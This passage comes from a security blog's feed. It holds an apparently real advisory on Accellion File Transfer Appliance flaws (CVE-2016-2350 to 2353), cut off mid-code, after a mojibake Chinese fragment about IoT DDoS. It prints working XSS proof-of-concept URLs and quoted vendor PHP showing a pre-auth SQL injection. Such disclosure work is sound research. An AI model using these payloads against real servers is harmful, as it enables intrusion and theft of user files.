ˆç›¤é»é¢¨éšªçš„æ‰€åœ¨ï¼Œé€éäººå·¥æ»²é€æ¸¬è©¦æ¨¡æ“¬æ”»æ“Šè€…çš„æ”»æ“Šæ€ç¶­åŠè·¯å¾‘ï¼Œå¦‚åŒè»äº‹æ¼”ç¿’ä¸€èˆ¬ï¼Œå°‡å…¥ä¾µçš„é€”å¾‘ä¸€ä¸€å°é–ã€‚æˆ‘å€‘èªç‚º IoT ç­‰åµŒå…¥å¼è£ç½®ã€æ™ºæ…§å®¶é›»ã€ç”šè‡³ç¶²é€šè³‡å®‰è¨­å‚™æœ¬èº«ï¼Œæœªä¾†éƒ½æœƒæ˜¯é§­å®¢çµ„ç¹”æ”»æ“Šçš„å°è±¡ï¼Œåˆ©ç”¨æ›´æ–°çš„å›°é›£åº¦è·Ÿç®¡ç†è€…çš„ç–æ–¼ç®¡ç†ï¼Œå»ºç½®ä¸€å€‹å€‹å¤§è¦æ¨¡æ®­å±å¤§è»ï¼Œæˆç‚ºæœªä¾†æˆ°çˆ­çš„æ£‹å­ã€‚æˆ‘å€‘æœŸè¨±æœªä¾†å» å•†å»ºæ§‹ç”¢å“æ™‚ï¼Œéƒ½èƒ½å„ªå…ˆç´å…¥è³‡å®‰è€ƒé‡ï¼Œä¸æˆç‚ºé»‘è‰²ç”¢æ¥­çš„å¹«å‡¶ï¼Œä¹Ÿè®“åœ‹éš›èªå¯å°ç£ç”¢å“æ˜¯è³‡å®‰è‡³ä¸Šçš„å„ªè‰¯å“è³ªã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2016/12/26/a-look-into-the-growth-of-IoT-DDoS-attacks/</link>
                <guid>https://devco.re/blog/2016/12/26/a-look-into-the-growth-of-IoT-DDoS-attacks</guid>
                <pubDate>Mon, 26 Dec 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Advisory: Accellion File Transfer Appliance Vulnerability</title>
                <description>&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/&quot;&gt;English Version&lt;/a&gt;  &lt;br /&gt;
&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;about-accellion-fta&quot;&gt;About Accellion FTA&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
Accellion File Transfer Appliance (&lt;code class=&quot;highlighter-rouge&quot;&gt;FTA&lt;/code&gt;) is a secure file transfer service which enables users to share and sync files online with AES 128/256 encryption. The Enterprise version further incorporates SSL VPN services with integration of Single Sign-on mechanisms like AD, LDAP and Kerberos.&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;vulnerability-details&quot;&gt;Vulnerability Details&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
In this research, the following vulnerabilities were discovered on the FTA version FTA_9_12_0 (13-Oct-2015 Release)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The above-mentioned vulnerabilities allow unauthenticated attackers to remotely attack FTA servers and gain highest privileges successfully. After the attackers fully controlled the servers, they will be able to retrieve the encrypted files and user data, etc.&lt;/p&gt;

&lt;p&gt;After reporting to CERT/CC, these vulnerabilities were assigned 4 CVEs (CVE-2016-2350, CVE-2016-2351, CVE-2016-2352, CVE-2016-2353).  &lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;areas-affected&quot;&gt;Areas Affected&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
According to a public data reconnaissance, there are currently 1,217 FTA servers online around the world, most of which are located in the US, followed by Canada, Australia, UK, and Singapore.  &lt;br /&gt;
Determine from the domain name and SSL Certificate of these servers, FTA is widely used by governmental bodies, educational institutions, enterprises, including several well-known brands.  &lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;vulnerability-analysis-and-exploitation&quot;&gt;Vulnerability Analysis and Exploitation&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;multiple-cross-site-scripting-cve-2016-2350&quot;&gt;Multiple Cross-Site Scripting (CVE-2016-2350)&lt;/h4&gt;

&lt;h5 id=&quot;1-xss-in-move_partition_framehtml&quot;&gt;1. XSS in move_partition_frame.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/move_partition_frame.html&lt;br /&gt;&lt;br /&gt;
?f2=â€™-prompt(document.domain);//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;2-xss-in-getimageajaxphp&quot;&gt;2. XSS in getimageajax.php&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/getimageajax.php&lt;br /&gt;&lt;br /&gt;
?documentname=â€onerror=â€prompt(document.domain)//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;3-xss-in-wminfohtml&quot;&gt;3. XSS in wmInfo.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/wmInfo.html&lt;br /&gt;&lt;br /&gt;
?msg=ssologout&lt;br /&gt;&lt;br /&gt;
&amp;amp;loginurl=â€&amp;gt;&amp;lt;svg/onload=â€prompt(document.domain)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;pre-auth-sql-injection-leads-to-rce-cve-2016-2351&quot;&gt;Pre-Auth SQL Injection leads to RCE (CVE-2016-2351)&lt;/h4&gt;

&lt;p&gt;After code reviewing, a pre-authentication SQL Injection vulnerability was found in FTA. This vulnerability grants malicious users access to sensitive data and personal information on the server through SQL Injection, and launch remote code execution (RCE) by further exploiting privilege-escalating vulnerabilities.  &lt;br /&gt;
The key to this problem lies in the &lt;code class=&quot;highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; function called by security_key2.api!&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/security_key2.api&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_generate_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_username&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;opendb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$client_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Among these parameters, &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_username&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;$client_id&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;$password&lt;/code&gt; are controllable by the attackers. And although the function &lt;code class=&quot;highlighter-rouge&quot;&gt;_decrypt( ... )&lt;/code&gt; handles the passwords, it does not involve in the triggering of the vulnerability.  &lt;br /&gt;
One thing to pay special attention is that the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; will be treated as a global variable which represents the current Application ID in use, and will be applied in &lt;code class=&quot;highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; accordingly. The code in &lt;code class=&quot;highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; includes the following lines:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DB_MASTER&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;mysql_select_db&lt;/code&gt;, the name of the database to be opened is controllable by the user. If wrong value was given, the program will be interrupted. Therefore, &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; must be forged correctly.&lt;/p&gt;

&lt;p&gt;The following lines are the most important function &lt;code class=&quot;highlighter-rouge&quot;&gt;client_properties( $client_id )&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_by&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$limit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;SELECT t_mail_server.* FROM t_mail_server &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;SELECT t_mail_server.*, t_profile.c_flag as profile_flag FROM t_mail_server, t_profile &amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_type&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysql_escape_like&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_type&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_status&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fatal_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;exec:mysql_query(&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;) respond:&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;221&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;c_server_id  != \&amp;#39;999\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;!(t_mail_server.c_flag &amp;amp; &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CLIENT_DELETED&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;)&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;c_server_id = \&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;c_manager = \&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
